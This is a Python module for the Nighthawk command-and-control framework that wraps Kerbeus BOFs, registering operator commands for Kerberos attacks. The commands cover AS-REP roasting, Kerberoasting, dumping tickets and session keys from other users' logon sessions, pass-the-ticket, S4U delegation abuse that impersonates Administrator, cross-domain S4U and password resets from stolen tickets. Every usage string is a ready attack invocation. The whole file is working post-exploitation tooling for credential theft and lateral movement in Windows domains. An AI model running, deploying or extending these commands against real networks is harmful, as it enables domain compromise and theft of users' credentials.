# =============================================================================
# Kerbeus BOFs - Nighthawk Python Module
# Port of kerbeus_cs.cna (HackerRalf Kerbeus-BOF) for Nighthawk C2
# from https://github.com/Gelzki/Kerbeus-BOF/blob/main/kerbeus_nh.py
# =============================================================================


# =============================================================================
# Section 1: Helpers
# =============================================================================

def load_bof(info, bof_name):
    """Load the Kerbeus BOF for the agent's architecture from _bin/."""
    arch = info.Agent.ProcessArch
    path = nighthawk.script_resource(f"_bin/{bof_name}.{arch}.o")
    try:
        with open(path, "rb") as f:
            data = f.read()
        if len(data) == 0:
            nighthawk.console_write(CONSOLE_ERROR, f"BOF file is empty: {path}")
            return None
        return data
    except Exception:
        nighthawk.console_write(
            CONSOLE_ERROR,
            f"Could not read BOF file: {path}\n"
            "Only x64 Kerbeus BOFs are built by the upstream Makefile.",
        )
        return None


def run_kerbeus(info, bof_name, params):
    """Pack params as a single null-terminated string and execute the BOF.

    Kerbeus BOFs take one argument: the entire raw command-line as passed to
    the alias (e.g. '/user:USER /password:PW /domain:D'). This mirrors the
    Cobalt Strike CNA which does:  bof_pack($bid, "z", $input)
    """
    bof_data = load_bof(info, bof_name)
    if bof_data is None:
        return
    arch = info.Agent.ProcessArch
    arg_line = " ".join(params)
    p = Packer()
    p.addstr(arg_line)
    api.execute_bof(
        f"{bof_name}.{arch}.o", bof_data, p.getbuffer(),
        "go", True, 0, False, "", show_in_console=True,
    )


# =============================================================================
# Section 2: Command Handlers
# =============================================================================

def cmd_krb_asreproasting(params, info):
    run_kerbeus(info, "asreproasting", params)


def cmd_krb_asktgt(params, info):
    run_kerbeus(info, "asktgt", params)


def cmd_krb_asktgs(params, info):
    run_kerbeus(info, "asktgs", params)


def cmd_krb_changepw(params, info):
    run_kerbeus(info, "changepw", params)


def cmd_krb_describe(params, info):
    run_kerbeus(info, "describe", params)


def cmd_krb_dump(params, info):
    run_kerbeus(info, "dump", params)


def cmd_krb_dump_high(params, info):
    run_kerbeus(info, "dump", ["/high"] + list(params))


def cmd_krb_dump_system(params, info):
    run_kerbeus(info, "dump", ["/system"] + list(params))


def cmd_krb_hash(params, info):
    run_kerbeus(info, "hash", params)


def cmd_krb_kerberoasting(params, info):
    run_kerbeus(info, "kerberoasting", params)


def cmd_krb_klist(params, info):
    run_kerbeus(info, "klist", params)


def cmd_krb_klist_high(params, info):
    run_kerbeus(info, "klist", ["/high"] + list(params))


def cmd_krb_klist_system(params, info):
    run_kerbeus(info, "klist", ["/system"] + list(params))


def cmd_krb_ptt(params, info):
    run_kerbeus(info, "ptt", params)


def cmd_krb_purge(params, info):
    run_kerbeus(info, "purge", params)


def cmd_krb_renew(params, info):
    run_kerbeus(info, "renew", params)


def cmd_krb_s4u(params, info):
    run_kerbeus(info, "s4u", params)


def cmd_krb_cross_s4u(params, info):
    run_kerbeus(info, "cross_s4u", params)


def cmd_krb_tgtdeleg(params, info):
    run_kerbeus(info, "tgtdeleg", params)


def cmd_krb_triage(params, info):
    run_kerbeus(info, "triage", params)


# =============================================================================
# Section 3: Command Registration
#
# Signature: register_command(function, name, long_description,
#                             short_description, usage, example)
# =============================================================================

nighthawk.register_command(cmd_krb_asreproasting, "krb_asreproasting",
    "Perform AS-REP roasting against users without Kerberos pre-auth",
    "Perform AS-REP roasting",
    "krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] [/aes]",
    "krb_asreproasting /user:pre_user")

nighthawk.register_command(cmd_krb_asktgt, "krb_asktgt",
    "Retrieve a TGT using a password, rc4/aes256 hash, or /nopreauth.\n"
    "  /user:USER /password:PW [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]\n"
    "  /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n"
    "  /user:USER /rc4:HASH    [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n"
    "  /user:USER /nopreauth   [/domain:DOMAIN] [/dc:DC] [/ptt]",
    "Retrieve a TGT",
    "krb_asktgt /user:USER /password:PW [/domain:D] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac] [/opsec]",
    "krb_asktgt /user:Admin /password:QWErty /enctype:aes256 /opsec /ptt")

nighthawk.register_command(cmd_krb_asktgs, "krb_asktgs",
    "Retrieve a TGS for one or more SPNs using a supplied TGT",
    "Retrieve a TGS",
    "krb_asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:D] [/dc:DC] "
    "[/tgs:BASE64] [/targetdomain:D] [/targetuser:USER] [/enctype:rc4|aes256] "
    "[/ptt] [/keylist] [/u2u] [/opsec]",
    "krb_asktgs /service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec")

nighthawk.register_command(cmd_krb_changepw, "krb_changepw",
    "Reset a user's password using a supplied TGT (KRB5 kpasswd)",
    "Reset a user's password from a TGT",
    "krb_changepw /ticket:BASE64 /new:PW [/dc:DC] [/targetuser:USER] [/targetdomain:D]",
    "krb_changepw /new:New_P4ss /ticket:doIF8DCCBey...")

nighthawk.register_command(cmd_krb_describe, "krb_describe",
    "Parse a base64-encoded Kerberos ticket and print its contents",
    "Parse and describe a ticket",
    "krb_describe /ticket:BASE64",
    "krb_describe /ticket:doIF8DCCBey...")

nighthawk.register_command(cmd_krb_dump, "krb_dump",
    "Dump tickets from a logon session (base64). Admin/elevated required for other sessions.\n"
    "Use /high for high-integrity (non-SYSTEM) TGT dump via KerbRetrieveTicketMessage,\n"
    "or /system for the classic SYSTEM (SeTcbPrivilege) path.",
    "Dump tickets",
    "krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]",
    "krb_dump /luid:3ea8")

nighthawk.register_command(cmd_krb_dump_high, "krb_dump_high",
    "Dump TGTs from a high-integrity (non-SYSTEM) process via KerbRetrieveTicketMessage.\n"
    "LSA returns full session keys for foreign LUIDs without SeTcbPrivilege.\n"
    "Based on https://jakeotte.com/posts/klist-revisited.html",
    "Dump TGTs (high integrity, no SYSTEM)",
    "krb_dump_high [/luid:LOGINID] [/user:USER]",
    "krb_dump_high")

nighthawk.register_command(cmd_krb_dump_system, "krb_dump_system",
    "Dump TGTs via the classic SYSTEM impersonation path (SeTcbPrivilege).\n"
    "Enumerates all logon sessions and dumps every ticket with full session keys.",
    "Dump TGTs (SYSTEM path)",
    "krb_dump_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
    "krb_dump_system /luid:3ea8")

nighthawk.register_command(cmd_krb_hash, "krb_hash",
    "Calculate Kerberos key hashes (rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1)",
    "Calculate Kerberos key hashes",
    "krb_hash /password:PW [/user:USER] [/domain:DOMAIN]",
    "krb_hash /password:QWErty /user:Admin /domain:domain.local")

nighthawk.register_command(cmd_krb_kerberoasting, "krb_kerberoasting",
    "Perform Kerberoasting by requesting a TGS for a target SPN.\n"
    "  /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n"
    "  /spn:SPN /ticket:BASE64 [/dc:DC]",
    "Perform Kerberoasting",
    "krb_kerberoasting /spn:SPN [/nopreauth:USER | /ticket:BASE64] [/dc:DC] [/domain:D]",
    "krb_kerberoasting /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...")

nighthawk.register_command(cmd_krb_klist, "krb_klist",
    "List tickets in the current (or specified) logon session.\n"
    "Use /high for high-integrity (non-SYSTEM) listing, or /system for the classic SYSTEM path.",
    "List tickets",
    "krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]",
    "krb_klist /luid:3ea8")

nighthawk.register_command(cmd_krb_klist_high, "krb_klist_high",
    "List tickets from a high-integrity (non-SYSTEM) process via KerbRetrieveTicketMessage.",
    "List tickets (high integrity, no SYSTEM)",
    "krb_klist_high [/luid:LOGINID] [/user:USER]",
    "krb_klist_high")

nighthawk.register_command(cmd_krb_klist_system, "krb_klist_system",
    "List tickets via the classic SYSTEM impersonation path (SeTcbPrivilege).",
    "List tickets (SYSTEM path)",
    "krb_klist_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
    "krb_klist_system /luid:3ea8")

nighthawk.register_command(cmd_krb_ptt, "krb_ptt",
    "Submit a TGT into the current (or specified) logon session",
    "Submit a TGT (pass-the-ticket)",
    "krb_ptt /ticket:BASE64 [/luid:LOGONID]",
    "krb_ptt /ticket:doIF8DCCBey...")

nighthawk.register_command(cmd_krb_purge, "krb_purge",
    "Purge tickets from the current (or specified) logon session",
    "Purge tickets",
    "krb_purge [/luid:LOGONID]",
    "krb_purge /luid:3ea8")

nighthawk.register_command(cmd_krb_renew, "krb_renew",
    "Renew a TGT using its renewable portion",
    "Renew a TGT",
    "krb_renew /ticket:BASE64 [/dc:DC] [/ptt]",
    "krb_renew /ticket:doIF8DCCBey... /ptt")

nighthawk.register_command(cmd_krb_s4u, "krb_s4u",
    "Perform S4U constrained delegation abuse. Use /impersonateuser or supply an additional /tgs",
    "S4U constrained delegation abuse",
    "krb_s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} "
    "[/domain:D] [/dc:DC] [/altservice:SVC] [/ptt] [/nopac] [/opsec] [/self]",
    "krb_s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator "
    "/service:host/comp.domain.local /altservice:http,cifs")

nighthawk.register_command(cmd_krb_cross_s4u, "krb_cross_s4u",
    "Perform S4U constrained delegation abuse across trusted domains",
    "S4U constrained delegation across domains",
    "krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:D /targetdc:DC "
    "{/impersonateuser:USER | /tgs:BASE64} [/domain:D] [/dc:DC] "
    "[/altservice:SVC] [/nopac] [/self]",
    "krb_cross_s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator "
    "/targetdomain:sdomain.local /targetdc:dc.sdomain.local "
    "/service:host/comp.sdomain.local /altservice:http,cifs")

nighthawk.register_command(cmd_krb_tgtdeleg, "krb_tgtdeleg",
    "Retrieve a usable TGT for the current user without elevation by "
    "abusing the Kerberos GSS-API",
    "Retrieve a usable TGT via GSS-API",
    "krb_tgtdeleg [/target:SPN]",
    "krb_tgtdeleg /target:HTTP/dc.domain.local")

nighthawk.register_command(cmd_krb_triage, "krb_triage",
    "List tickets from one or more logon sessions in a compact table",
    "List tickets in table format",
    "krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
    "krb_triage /luid:3ea8")